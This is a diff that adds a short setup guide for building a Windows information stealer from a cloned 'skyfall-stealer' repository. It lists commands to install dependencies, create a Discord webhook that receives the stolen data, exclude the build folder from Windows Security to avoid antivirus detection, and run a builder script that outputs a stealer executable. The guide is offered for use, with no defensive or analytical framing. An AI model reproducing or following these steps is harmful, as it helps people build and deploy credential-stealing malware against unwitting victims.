@@ -1,0 +1,44 @@
+- Install Python on Windows
+
+- Install git
+
+- git clone https://github.com/macstoffel/skyfall-stealer-3ct0s-fork-.git
+
+- Where is python installed:
+
+$ python
+Python 2.6.6 (r266:84297, Aug 24 2010, 18:13:38) [MSC v.1500 64 bit (AMD64)] on win32
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import sys
+>>> sys.executable
+'c:\\Python26\\python.exe'
+>>> sys.exec_prefix
+'c:\\Python26'
+
+- Set PATH to Python in windows ENV-Variable:
+
+search for ENV and open: "edit the system variables"
+Go to the bottom: "Environment Variables"
+Add the path above to "path"
+
+- Go in CMD to the github-clone Folder
+
+- $ pip install virtualenv
+
+- $ python -m venv .\venv  (make virtual environment)
+
+- $ .\venv\Scripts\activate  (activate virtual environment)
+
+- $ pip install pyinstaller cryptography discord_webhook pycryptodome pypiwin32  (install dependancies on virt-env)
+
+- Setup a Webhook on Discord
+
+- Exclude Folder from Windows Security
+
+- $ .\venv\Scripts\python.exe builder.py -w YOUR_WEBHOOK_URL -o FILE_NAME
+
+- the exe-file is in the dist-folder
+
+- .\venv\Scripts\deactivate
+
+
